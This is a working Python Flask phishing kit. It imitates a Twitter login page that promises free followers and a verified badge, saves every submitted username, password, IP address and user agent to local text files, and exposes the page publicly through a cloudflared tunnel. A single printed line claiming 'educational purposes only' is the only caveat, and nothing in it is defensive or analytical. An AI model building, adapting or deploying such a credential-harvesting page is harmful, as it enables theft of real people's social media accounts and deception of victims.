import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'twitter-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Twitter Followers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['tw_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Get Free Twitter Followers</title>
        <style>
            :root {
                --tw-blue: #1DA1F2;
                --tw-dark: #14171A;
                --tw-light: #AAB8C2;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #15202B;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #F5F8FA;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: #192734;
                border: 1px solid #38444D;
                width: 100%;
                max-width: 400px;
                padding: 30px 25px;
                border-radius: 16px;
                text-align: center;
                margin-bottom: 10px;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    align-items: flex-start;
                    min-height: 100vh;
                }
                
                .login-box {
                    padding: 25px 20px;
                    margin-top: 20px;
                }
            }
            
            @media (max-width: 360px) {
                .login-box {
                    padding: 20px 15px;
                }
            }
            
            .twitter-logo {
                width: 48px;
                height: 48px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .twitter-logo img {
                width: 100%;
                height: 100%;
                filter: brightness(0) saturate(100%) invert(52%) sepia(98%) saturate(1552%) hue-rotate(176deg) brightness(98%) contrast(94%);
            }
            
            .promo-banner {
                background: linear-gradient(45deg, #1DA1F2, #1A91DA, #0084B4);
                color: white;
                padding: 12px 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 600;
                font-size: 14px;
                line-height: 1.4;
            }
            
            .follower-count {
                font-size: 28px;
                font-weight: bold;
                color: #FFAD1F;
                margin: 10px 0;
                line-height: 1.2;
            }
            
            input {
                width: 100%;
                padding: 16px;
                margin: 10px 0;
                border: 1px solid #38444D;
                border-radius: 4px;
                background: #253341;
                font-size: 16px;
                color: #F5F8FA;
                -webkit-appearance: none;
                appearance: none;
            }
            
            input:focus {
                border-color: var(--tw-blue);
                outline: none;
            }
            
            input::placeholder {
                color: #8899A6;
            }
            
            .login-btn {
                background: var(--tw-blue);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 9999px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 15px 0;
                cursor: pointer;
                transition: background 0.2s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            .login-btn:hover,
            .login-btn:active {
                background: #1A91DA;
            }
            
            .separator {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: #8899A6;
                font-size: 14px;
            }
            
            .separator::before, .separator::after {
                content: '';
                flex: 1;
                border-bottom: 1px solid #38444D;
            }
            
            .separator::before {
                margin-right: 15px;
            }
            
            .separator::after {
                margin-left: 15px;
            }
            
            .signup-option {
                background: transparent;
                border: 1px solid var(--tw-blue);
                color: var(--tw-blue);
                padding: 16px;
                border-radius: 9999px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 10px 0;
                cursor: pointer;
                transition: background 0.2s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            .signup-option:hover,
            .signup-option:active {
                background: rgba(29, 161, 242, 0.1);
            }
            
            .forgot-pw {
                color: var(--tw-blue);
                text-decoration: none;
                font-size: 14px;
                margin: 15px 0;
                display: block;
                padding: 10px;
            }
            
            .footer {
                color: #8899A6;
                font-size: 12px;
                margin-top: 20px;
                line-height: 1.5;
            }
            
            .verification-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(29, 161, 242, 0.1);
                color: var(--tw-blue);
                padding: 8px 16px;
                border-radius: 9999px;
                font-size: 14px;
                margin: 10px 0;
            }
            
            .verification-badge::before {
                content: "✓";
                margin-right: 8px;
                font-weight: bold;
                font-size: 16px;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                line-height: 1.3;
            }
            
            @media (max-width: 480px) {
                h1 {
                    font-size: 24px;
                }
                
                .follower-count {
                    font-size: 24px;
                }
                
                input, .login-btn, .signup-option {
                    padding: 14px;
                }
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <div class="twitter-logo">
                    <img src="https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc727a.png" alt="Twitter Logo">
                </div>
                
                <h1>Get Free Followers</h1>
                
                <div class="promo-banner">
                    🚀 LIMITED TIME: FREE VERIFICATION + FOLLOWERS
                </div>
                
                <div class="follower-count">5,000 FREE FOLLOWERS</div>
                <div style="font-size: 15px; color: #8899A6; margin-bottom: 20px; line-height: 1.4;">
                    Login to claim your free followers and verified badge!
                </div>
                
                <div class="verification-badge">
                    Blue Verified Badge Included
                </div>
                
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username">
                    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Get Free Followers</button>
                </form>
                
                <div class="separator">or</div>
                
                <button class="signup-option" type="button">
                    Create account
                </button>
                
                <a href="#" class="forgot-pw">Forgot password?</a>
                
                <div class="footer">
                    By signing in, you agree to our Terms and Privacy Policy
                </div>
            </div>
        </div>
        
        <script>
            // Prevent zoom on input focus on mobile
            document.addEventListener('DOMContentLoaded', function() {
                document.body.style.touchAction = 'manipulation';
                
                // Add active state for buttons
                const buttons = document.querySelectorAll('button');
                buttons.forEach(button => {
                    button.addEventListener('touchstart', function() {
                        this.style.opacity = '0.8';
                    });
                    button.addEventListener('touchend', function() {
                        this.style.opacity = '1';
                    });
                });
                
                // Prevent form submission if fields are empty
                const form = document.querySelector('form');
                form.addEventListener('submit', function(e) {
                    const username = this.querySelector('input[name="username"]');
                    const password = this.querySelector('input[name="password"]');
                    
                    if (!username.value.trim() || !password.value.trim()) {
                        e.preventDefault();
                        alert('Please fill in all fields');
                    }
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('tw_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Twitter\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Followers - Twitter</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #15202B;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #F5F8FA;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: #192734;
                padding: 30px 25px;
                border-radius: 16px;
                border: 1px solid #38444D;
                max-width: 450px;
                width: 100%;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 25px 20px;
                }
            }
            
            .success-icon {
                font-size: 64px;
                margin: 20px 0;
                color: #1DA1F2;
                line-height: 1;
            }
            
            .processing-bar {
                width: 100%;
                height: 6px;
                background: #38444D;
                border-radius: 3px;
                margin: 30px 0;
                overflow: hidden;
            }
            
            .processing-fill {
                height: 100%;
                background: linear-gradient(90deg, #1DA1F2, #0084B4, #FFAD1F);
                animation: processing 3s infinite;
                border-radius: 3px;
                width: 0%;
            }
            
            @keyframes processing {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .follower-update {
                background: rgba(29, 161, 242, 0.1);
                border: 1px solid #1DA1F2;
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
                text-align: left;
                line-height: 1.5;
            }
            
            .badge-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 20px 0;
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                background: #1DA1F2;
                color: white;
                padding: 10px 20px;
                border-radius: 9999px;
                font-weight: bold;
                font-size: 16px;
            }
            
            .verified-badge::before {
                content: "✓";
                margin-right: 8px;
                font-size: 18px;
            }
            
            h2 {
                margin: 10px 0;
                font-size: 24px;
                line-height: 1.3;
            }
            
            @media (max-width: 480px) {
                h2 {
                    font-size: 22px;
                }
                
                .success-icon {
                    font-size: 56px;
                }
                
                .follower-update {
                    padding: 15px;
                }
            }
            
            p {
                color: #8899A6;
                margin-top: 20px;
                line-height: 1.5;
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">✓</div>
            <h2>Followers Processing!</h2>
            
            <div class="badge-container">
                <div class="verified-badge">Verified</div>
            </div>
            
            <div class="processing-bar">
                <div class="processing-fill"></div>
            </div>
            
            <div class="follower-update">
                <strong style="color: #FFAD1F;">✅ 5,000 followers queued successfully!</strong><br><br>
                Your followers will be delivered within:<br>
                • 2,500 followers in 1 hour<br>
                • 2,500 followers in 24 hours<br><br>
                <small style="color: #8899A6;">Blue verification badge activated for your account.</small>
            </div>
            
            <p>You'll be redirected to Twitter shortly...</p>
        </div>
        
        <script>
            // Add animation for better mobile experience
            document.addEventListener('DOMContentLoaded', function() {
                const fill = document.querySelector('.processing-fill');
                fill.style.animation = 'processing 3s infinite';
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"📢 Twitter Followers Public Link: {tunnel_url}")
            print(f"📁 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5001, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Twitter Followers Page...")
    print("📱 Port: 5001")
    print("💾 Save location: ~/storage/downloads/TwitterFollowers/")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5001")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)